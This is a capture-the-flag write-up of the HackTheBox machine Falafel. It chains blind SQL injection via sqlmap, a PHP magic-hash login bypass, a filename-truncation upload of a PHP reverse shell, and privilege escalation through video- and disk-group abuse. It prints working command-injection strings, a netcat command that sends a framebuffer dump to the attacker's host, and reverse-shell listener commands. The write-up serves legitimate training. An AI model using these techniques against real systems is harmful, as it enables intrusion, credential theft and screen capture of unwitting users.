# Falafel [HTB](https://app.hackthebox.com/machines/124)
![falafel-01]()


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 falafel.htb
```

![ports-02]()


From here I run a version detection scan on these two ports:

```bash
nmap -p 22,80 -sCV falafel.htb -oN nmap.result
```

![nmap-res-03]()

We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.18 on port 80.


Based on the `nmap` probing scripts, we can see the presence of a `robots.txt` file which restricts web-crawlers from accessing any `.txt` files on the website. This tells me that perhaps there are sensitive text files to be discovered. 


Based on the SSH probing scripts, we can identify the target OS to be `Ubuntu`.


Let's check this `Falafel Lovers` site. 


### Apache Port 80

If we browse towards `http://falafel.htb/` we see the following:

![site-04]()


The main page mentions that this is a `"beta version"` of the website, and that bugs can be reported to `IT@falafel.htb`. We also see a `Login` button which redirects to `login.php` as well as a `Home` link which redirects back to the main page at `index.php`.


I intercepted the main page in my Burp proxy to see if there is any juicy information in the HTML source code or HTTP headers but they were all fairly normal. 


At this point I decided to run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://falafel.htb/FUZZ -e .txt,.xml,.html,.php
```

![ffuf-05]()


Most of the files here are common user session handeling scripts, like `login.php`, `logout.php`, `profile.php`, etc. Most of the directories like `js`, `css`, `assets`, etc, are also pretty common. 


What's unique is that we have an `upload` directory coupled with an `upload.php` script, which is a strong indication for a file upload feature on this website. 


We also have this `cyberlaw.txt` file which reads as such:

![cyberlay-06]()



The file is written by the `admin` user which says, that a security incident occurred in which a user was able to bypass authentication and gain access over the `admin` user account. Which in turn, lead to a complete take over the server due to an abuse of the image upload feature. 


The key point here in my opinion, is the fact that the authentication bypass occurred without knowing the `admin` password, which to me suggests SQLi. 


Other then that, the note essentially outlines the exploitation path we need to follow in order to get access to this machine. 


### SQLi


At first, I tried to login in as an innocent user, supplying simple credentials, evaluating the response I get from the server. When authenticating using `admin : admin` I got the following message:

![intended-07]()


The message ` Wrong identification : admin ` is fairly ambiguous, but we know from the previous text file that there should be an account with a username of `admin`, so the message must be referring to the password being incorrect. 


Next, I started playing around with some SQLi authentication bypass payloads. I've noticed that if we play around with the password value while leaving the username as `admin`, we get the same message. For example, authentication using: `admin : " or ""*"` resulted in the same `"Wrong identification"` error message.


But if we reverse the values, and send the SQLi payload as the username, while supplying an arbitrary value as the password, for example with an input like this: `" or ""*" : admin`, we get a new error message:

![try-again-08]()


That's interesting. There must be some form of validation on the username field. So I started messing around with different username values. 


For example, we know that there ahould also be a `chris` user account. If we try to authenticate as `chris` with a random password we also get the `Wrong identification` error message. But if we send a username like `john` we get the `Try again..` error message once again.


We can conclude from this that the application first validates the supplied username before checking the password. If the username is valid but the password isn't, we get the `Wrong Identification` error message. If the username is invalid we get the `Try again..` error message. 


Then I noticed another interesting thing. If we send a payloads that contain certain SQLi commands like the `UNION`, `SELECT`, `SLEEP`, etc, as the username value, we get a new error message:

![detected-09]()


The message says `Hacking Attempt Detected!`. So there must be some form of user input validation on the sever side. 


Let's summarize what we've observed thus far:

+ Inputting a valid username with a wrong password returns an `Wrong Identification` error.
+ Inputting an invalid username, returns the `Try again..` error.
+ Sending payloads containing SQLi commands for the username value returns `Hacking Detected` error.
+ Messing around with the password value doesn't seem to result in such errors.
+ There are two valid user accounts on the system of `chris` & `admin`.


At this point I deicded to brute force some SQLi payloads, I uploaded the [following list](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass) from hacktricks to Burp's Intruder and ran different attacks. This yielded nothing. 


Then I tired to do the same, just using differnet types of SQLi payloads from [a different list](https://github.com/payloadbox/sql-injection-payload-list), but to no avail.


Let's try `sqlmap`


### Sqlmap

I start by making a login request with arbitrary credentials and save it to a file:

![copy-file-10]()


Then I run `sqlmap` on the saved request as such:

```bash
sqlmap -r login.req --batch 
```

But to no avail. I also tried incresing the risk levels by adding the `--level 5 --risk 3` switches, but this faild as well.


Sometimes, `sqlmap` struggles to deterimine if it managed to find a working SQLi payload or not. This is because every application is inherently different. Thus, it's behaviour and responses are different from every other application, making it difficult for `sqlmap` to determine a successful payload. 


What we can do in these situations, is help guide `sqlmap` in determining a susccssful payload by using the `--string` and `--not-string` options. The `--string <str>` option tells `sqlmap` to look for the `<str>` in the server's response, and determine success based on it's presence. The `--not-string` works in the reverse logic.


We know that the application validates the supplied username and returns a response based on the validity of said username. If a correct username was suplied but the password was incorrect, then the `Wrong Identification` error message is returned. 


Based on this logic, we can tell `sqlmap` to only focus on the `username` parameter using the `-p` switch, this in theory should cause the application to return the `Try again..` error everytime because the username will obviously be incorrect. Therefore, if `sqlmap` ever encounters the `Wrong identification` error message in the server's response, the paylaod it sent must have worked. 


We can configure this logic into `sqlmap` using the `--string` swtich as such:
 
```bash
sqlmap -r login.req --batch -p "username" --string "Wrong"
```

![sqlmap-11]()


We got a couple of blind SQLi payloads which seem to work! 


From here we need to enumerate the databases on the target. We can do that by adding the `--dbs` switch:

```bash
sqlmap -r login.req --batch -p "username" --string "Wrong" --dbs
```

![dbs-12]()


We have two databases of `information_schema` and `falafel`. let's dump out the tabels from the `falafel` database using:

```bash
sqlmap -r login.req --batch -p "username" --string "Wrong" --tables
```

![tables-13]()


The `falafel` database has one table called `users`, let's dump it out:

```bash
sqlmap -r login.req --batch -p "username" --string "Wrong" -D "falafel" -T "users" --dump
```

![dump-14]()



We can see the password hashes for `admin` & `chris`. I tried to crack the `admin`'s hash but without success. I also tried looking it up in [crackstation](https://crackstation.net/) but to no avail. 


However, `chris`'s password was cracked by `sqlmap` to `juggling`, lets login:

![login-15]()


### Chris Access


In `chris`'s profile page, there is a strong reference to `juggling`. There is a known term in the PHP language called [Type Juggling](https://www.php.net/manual/en/language.types.type-juggling.php), which is commonly used as an exploit vector againts PHP applications. 


In short, PHP tries to predict the programmer's intentions when dealing with variables and as a result, can at times convert them to different types of objects (int to float for example) whenever PHP deems it to be necessary. This object conversion is called `Type Jungling`. 


This can lead to unexpected results, especially when using the `==` operator which performs a loose comparison, only evaluating the variable's values, not the thier actual types. 


If we search for the term `PHP-Jungling` online we can find [this great](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md) Github cheet-sheet from `swisskyrepo`. In it, we will find a `Magic Hashes` section which outlines that when PHP converts string hashes that starts with `0e` (like our admin's hash), it will treat this hash as a scientific notation, thus treating it as a float object. 


The cheet-sheet page also gives a few different payloads we can use againts different types of hashes. I endded up using `admin : 0e1137126905` to login:

![admin-login-16]()


## File Upload 


After we login as the `admin` user we are greeted to the image upload feature at `/upload.php`. I start by using the application in it's inteded use case.


I generate a basic PNG image with proper magic-numbers using the following script:

```python
from PIL import Image
img = Image.new('RGB', (320,320), color='black')
img.save('empty.png')
quit()
```

Then, I host this image using a python web server:

```bash
python3 -m http.server 80
```

And I give my server's URL to the application to fetch the image. 


The application did connect to my server to retrieve the file. But the more interesting thing is the output in the application:

![output-17]()


I see a real possibility for a command injection here. 


I spent quite a bit of time testing different payloads. For example:

```bash
http://10.10.14.52/empty.png;id#
http://10.10.14.52/emp$(id)ty.png
'';id
http://10.10.14.52/em`id`pty.png
http://10.10.14.52/%0Aid#empty.png
http://10.10.14.52/em'id#pty.png
http://10.10.14.52/empty.png%00id#
```

And many more, all failed. There is quite good user input validation going on here. 


Next, I turned to file upload bypasses. I tried to upload [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)'s PHP reverse shell instead of an image. 


I spent quite a lot of time on this as well, here are some of the following techniques I tried:

```bash
http://10.10.14.52/rshell.php%20
http://10.10.14.52/rshell.php%0a
http://10.10.14.52/rshell.png.php
http://10.10.14.52/rshell.php%00.png
http://10.10.14.52/rshell.png.jpg.php
```

And many more, nothing worked. 


Then, I decided to try and break the OS filename limit, to cut off the final `.png` exntesion leaving the file ending with `.php`. 


First we need to understand what is the OS file size limits, I start with the maximum allowed limit which is 255 bytes. I rename my image as such:

```bash
mv empty.png `python -c "print('A' * 251)"`.png
```

![name-18]()


If we send the application to fetch this file we get the following:

![shorten-19]()


We did manage to break the filename limit. Now it's a matter of finding the right offset in which we can send a file ending with `<A's>.php.png` and have it shortened to `<A's>.php`. 


After a bit fo trail and error I came to find that we need to send a filename with the length of 242 characters. This will result in the OS trimming down the last 4 charaters (`.png`) in order to reach the maximum allowed filename size of 238, leaving the filename saved with the extension `.php`. 


I rename my file as such:

```bash
mv rshell.php `python -c "print('A'*234)"`.php.png 
```

I make sure I update my local listener settings for the reverse shell in the PHP script, and I upload it to the application:

![uploaded-21]()


This was a success, as the `Saving to:` argument endded in `.php`.


So now I start my local lisetner using:

```bash
rlwrap nc -lnvp 443 
```

And open the path to our reverse shell at:

```bash
http://falafel.htb//uploads/0103-1545_4763f588cab25f74/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
```

![shell-22]()


## Privilege Escalation


After landing a shell on the box I upgrade my shell using:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next, I try to list any `sudo` permissions but I get prompted for credentials. Instead I start looking around the filesystem. I start with the `/var/www/html` directory because I know we have access to all the files there as the `www-data` service account:


![var-www-23]()


We know we have a MySQL database somewhere on this system, therefore this `connection.php` script is probably used to connect to the database:

![connection-24]()


We can see that the credentials to the database are `moshe : falafelIsReallyTasty`. 


If we list the contents of the `/home` directory, we will find that `moshe` is an active user on the system:

![home-25]()


Therefore I try to reuse the password to login via SSH as `moshe` and it worked:

![ssh-26]()


### Moshe

Connecting via SSH gave me a really clunky and annoying shell, so I upgrade it same as before:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Based on the output from the `id` command we can see that `moshe` is a part of the `video` group. This group membership can be abused to capture screen frames for other logged in users.


If we run the `w` command, we can see that `yossi` is also connected:

![w-27]()


If we check for any frame-buffer devices on the system, we will find one such device:

```bash
ls /dev/ | grep fb*
```

![device-28]()


This is probably where `yossi`'s screen is being rendered from. 


We can abuse our `video` group membership to copy the contents of this device and send it over to our attack machine to analyze. For this, I start a local listener on my attack machine which redirects the input to a file:

```bash
nc -lnvp 3899 > screen.raw
```

Then, from the target I `cat` the device and pipe it to my netcat listener:

```bash
cat /dev/fb0 | nc 10.10.14.52 3899
```

The next step is to find the resolution that the screen is using. This we can find using:

```bash
cat /sys/class/graphics/fb0/virtual_size
```

![resolution-29]()


Now we can use the following perl script to turn this frame into an image:

```perl
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```


We can use it as such:

```bash
./video.pl 1176 885 < screen.raw > screen.png
```

This should make a `screen.png` file in your working directory. 


The image looks like this:

![image-30]()


It looks like `yossi` tried to run `passwd` in order to change he's password. But he made a mistake supplying the password while invoking `passwd` when he ran it the first time. So he's passwrod should be `MoshePlzStopHackingMe!`


If we supply this password to `su yossi -` we get a shell as `yossi`:

![yossi-31]()


### Yossi

Based on the output of the `id` command we can see that `yossi` is a part of the `disk` group. This is a very high-privilged group designed to give low-privilege users access to administer block-devices, partitions and filesystems. 


This privilege can be abused to copy the contents of the block device on which the root filesystem is mounted. Then, it we can sent over to an attackers machine, mounted, and traversed with ease. 


First, we need to identify the parition layout on the system. We can do this by running `lsblk`:

![lsblk-32]()


The root filesystem is mounted on the `/dev/sda1` partition. I tried to copy this over to my attack machine and mount it there but I had issues pulling this off. 


Instead we can use something like `debugfs` to traverse the device and get the root flag:

```bash
debugfs /dev/sda1
```

![root-33]()


We can also read the contents of the `/etc/shadow` file from the `debugfs` shell, but I wasn't able to crack the root hash. 
